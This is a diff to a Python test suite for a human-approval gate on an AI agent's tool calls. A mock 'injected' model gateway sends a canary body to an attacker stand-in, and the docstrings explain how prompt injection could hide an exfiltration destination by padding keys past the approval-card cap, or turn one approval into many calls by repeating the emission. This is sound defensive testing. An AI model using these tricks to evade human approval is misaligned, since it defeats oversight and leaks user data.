@@ -21,6 +21,7 @@ for "did anything actually leave".
 """
 from __future__ import annotations
 
+import asyncio
 import json
 from datetime import datetime, timedelta, timezone
 
@@ -145,17 +146,63 @@ def test_preview_is_redacted_bounded_and_single_line():
             "nested": {"token": _REDACTABLE_VALUE},
         }
     )
-    blob = json.dumps(preview)
+    blob = json.dumps(preview.shown)
     assert "supersecret" not in blob
     assert _REDACTABLE_VALUE not in blob
-    assert preview["body"] == "line one line two"
-    assert len(preview["long"]) < 5_000
+    assert preview.shown["body"] == "line one line two"
+    assert len(preview.shown["long"]) < 5_000
     assert "\n" not in blob
+    # Every key still appears; nothing about being long removes it from view.
+    assert set(preview.shown) == {"api_key", "body", "long", "nested"}
+    assert preview.omitted == 0
 
 
-def test_preview_entry_count_is_bounded():
-    preview = build_preview({f"k{i}": i for i in range(100)})
-    assert len(preview) <= 12
+def test_preview_never_silently_drops_arguments():
+    """The card must not let the attacker choose what the human sees.
+
+    The digest covers the whole argument object, but the preview was capped at
+    12 keys by sort order, and ``validate_args`` deliberately tolerates
+    properties outside the declared schema (``_make_handler`` forwards them
+    verbatim). So injected text controlled both the argument set and the key
+    names, and therefore which keys survived the cut: pad with filler keys that
+    sort before ``to`` and the destination of an exfiltration disappears from
+    the card while still going out on the wire. Truncated *values* show an
+    ellipsis; dropped *keys* showed nothing at all.
+    """
+    # More filler keys than the old 12-entry cap, all sorting before "to" and
+    # "body" so the destination and payload are what fell off the end.
+    arguments = {f"a{index:02d}": "filler" for index in range(1, 21)}
+    arguments["to"] = _ATTACKER
+    arguments["body"] = _CANARY
+    preview = build_preview(arguments)
+
+    # Either every key is present, or the omission is explicit and countable.
+    assert preview.omitted == len(arguments) - len(preview.shown)
+    if preview.omitted:
+        assert preview.truncated is True
+    # The destination and payload of an exfiltration can never be the fields
+    # that fall off the end.
+    assert preview.shown.get("to") == _ATTACKER
+    assert _CANARY in preview.shown.get("body", "")
+
+
+def test_preview_reports_omission_when_it_genuinely_cannot_show_everything():
+    """Past the hard cap keys really are dropped — but never silently."""
+    preview = build_preview({f"k{index:04d}": index for index in range(500)})
+    assert preview.truncated is True
+    assert preview.omitted == 500 - len(preview.shown)
+    assert preview.omitted > 0
+    # Still bounded: the card cannot become a payload of its own.
+    assert len(json.dumps(preview.shown)) < 8_000
+
+
+def test_preview_distinguishes_masked_from_shown():
+    """``***REDACTED***`` hides a value on the card while the digest and the
+    wire carry it in full, so "masked" must be a visibly different state from
+    "this is the value"."""
+    preview = build_preview({"api_key": "supersecretvalue1234567890ABCDEFGHIJ"})
+    assert "api_key" in preview.masked
+    assert "supersecret" not in json.dumps(preview.shown)
 
 
 def test_draft_carries_the_destination_host_and_a_safe_label():
@@ -276,12 +323,15 @@ class _InjectedModelGateway:
     Turn 1 of every exchange asks to ship ``body`` to ``to``; turn 2 answers in
     prose once it sees the tool result (or the denial) fed back. ``arguments``
     is settable so a test can make the *approved* call and the *attempted* call
-    differ by exactly one field.
+    differ by exactly one field, and ``repeat`` emits the SAME call several
+    times in ONE assistant message — the shape an injection uses to turn a
+    single human approval into many outbound calls.
     """
 
-    def __init__(self, arguments: dict | None = None) -> None:
+    def __init__(self, arguments: dict | None = None, *, repeat: int = 1) -> None:
         self.calls = 0
         self.arguments = arguments or {"to": _ATTACKER, "body": _CANARY}
+        self.repeat = repeat
         self.seen: list[list[dict]] = []
 
     async def complete(
@@ -298,13 +348,14 @@ class _InjectedModelGateway:
                             "content": None,
                             "tool_calls": [
                                 {
-                                    "id": "c1",
+                                    "id": f"c{index + 1}",
                                     "type": "function",
                                     "function": {
                                         "name": _SEND_ALIAS,
                                         "arguments": json.dumps(self.arguments),
                                     },
                                 }
+                                for index in range(self.repeat)
                             ],
                         }
                     }
@@ -384,6 +435,15 @@ def _connector() -> FakeMcpConnector:
     return FakeMcpConnector(
         [_SEND], call_results={"send": McpToolResult(content="delivered")}
     )
+
+
+def _dev_user_id(c: TestClient, session_id: str) -> str:
+    """The internal user id behind the dev auth identity, read from the store.
+
+    Derived rather than hardcoded: it is a hash of the dev subject, so pinning
+    the literal would silently rot if that derivation ever changed.
+    """
+    return c.app.state.session_repo._sessions[session_id].userId
 
 
 def _hold(c: TestClient, session_id: str, **kwargs) -> dict:
@@ -585,6 +645,39 @@ def test_expired_approval_fails_closed():
         c.__exit__(None, None, None)
 
 
+def test_one_approval_authorizes_exactly_one_execution():
+    """One click must buy one call, not one call *per emission*.
+
+    ``consumed`` makes *redemption* single-use, but redemption happens once per
+    turn while the resulting invocation key was then consulted for every tool
+    call the model emitted. The model's tool-call list is exactly what injected
+    context influences, so the attacker chose the repeat count — one approval
+    became up to the per-turn budget in real outbound calls, which for a
+    destructive tool is that many unauthorized side effects.
+    """
+    connector = _connector()
+    c = _client(connector)
+    try:
+        session_id = _bootstrap(c)
+        c.app.state.gateway = _InjectedModelGateway()
+        prompt = _hold(c, session_id)
+
+        # Same approved call, emitted five times in one assistant message.
+        c.app.state.gateway = _InjectedModelGateway(repeat=5)
+        response = _turn(
+            c,
+            session_id,
+            approvals=[{"requestId": prompt["id"], "grant": prompt["grant"]}],
+        )
+        assert response.status_code == 200, response.text
+        assert len(connector.tool_calls) == 1
+        # The repeats were held, not silently dropped, so the user is asked
+        # again rather than the model quietly retrying behind their back.
+        assert response.json()["approvals"]
+    finally:
+        c.__exit__(None, None, None)
+
+
 def test_approval_is_single_use():
     connector = _connector()
     c = _client(connector)
@@ -733,8 +826,8 @@ def test_approval_mode_off_is_a_real_documented_opt_out():
 
 
 def test_consumption_failure_denies_rather_than_degrades():
-    """If the "spent" write fails we must not run the call: an approval we cannot
-    record as used is an approval that can be used again."""
+    """If the burn fails we must not run the call: an approval we cannot record
+    as used is an approval that can be used again."""
     connector = _connector()
     c = _client(connector)
     try:
@@ -743,14 +836,11 @@ def test_consumption_failure_denies_rather_than_degrades():
         prompt = _hold(c, session_id)
 
         repo = c.app.state.session_repo
-        original = repo.upsert_message
 
-        async def failing_upsert(user_id, message):
-            if message.pendingApprovals:
-                raise RuntimeError("store unavailable")
-            return await original(user_id, message)
+        async def failing_consume(*_args, **_kwargs):
+            raise RuntimeError("store unavailable")
 
-        repo.upsert_message = failing_upsert  # type: ignore[method-assign]
+        repo.consume_tool_approval = failing_consume  # type: ignore[method-assign]
         c.app.state.gateway = _InjectedModelGateway()
         response = _turn(
             c,
@@ -759,5 +849,73 @@ def test_consumption_failure_denies_rather_than_degrades():
         )
         assert response.status_code == 200, response.text
         assert connector.tool_calls == []
+    finally:
+        c.__exit__(None, None, None)
+
+
+def test_lost_burn_race_denies():
+    """A redemption that did not win the compare-and-set must not authorize.
+
+    The local ``consumed`` check reads a snapshot and is only advisory; the
+    authoritative single-use decision is the repository's conditional write, so
+    a caller that loses it has to deny even though every local check passed.
+    """
+    connector = _connector()
+    c = _client(connector)
+    try:
+        session_id = _bootstrap(c)
+        c.app.state.gateway = _InjectedModelGateway()
+        prompt = _hold(c, session_id)
+
+        repo = c.app.state.session_repo
+
+        async def lost_race(*_args, **_kwargs):
+            return False
+
+        repo.consume_tool_approval = lost_race  # type: ignore[method-assign]
+        c.app.state.gateway = _InjectedModelGateway()
+        response = _turn(
+            c,
+            session_id,
+            approvals=[{"requestId": prompt["id"], "grant": prompt["grant"]}],
+        )
+        assert response.status_code == 200, response.text
+        assert connector.tool_calls == []
+    finally:
+        c.__exit__(None, None, None)
+
+
+def test_concurrent_redemptions_of_one_grant_burn_it_once():
+    """Two racing requests presenting the same grant: exactly one wins.
+
+    Driven against the repository's CAS directly rather than through two
+    concurrent HTTP calls, because the property under test is the atomicity of
+    the burn, and a TestClient turn serializes the interesting window away.
+    """
+    connector = _connector()
+    c = _client(connector)
+    try:
+        session_id = _bootstrap(c)
+        c.app.state.gateway = _InjectedModelGateway()
+        prompt = _hold(c, session_id)
+        repo = c.app.state.session_repo
+        messages = c.get(f"/api/sessions/{session_id}/messages").json()
+        message_id = messages[-1]["id"]
+
+        async def race():
+            return await asyncio.gather(
+                *(
+                    repo.consume_tool_approval(
+                        _dev_user_id(c, session_id),
+                        session_id,
+                        message_id,
+                        prompt["id"],
+                    )
+                    for _ in range(8)
+                )
+            )
+
+        results = asyncio.run(race())
+        assert sum(1 for won in results if won) == 1
     finally:
         c.__exit__(None, None, None)
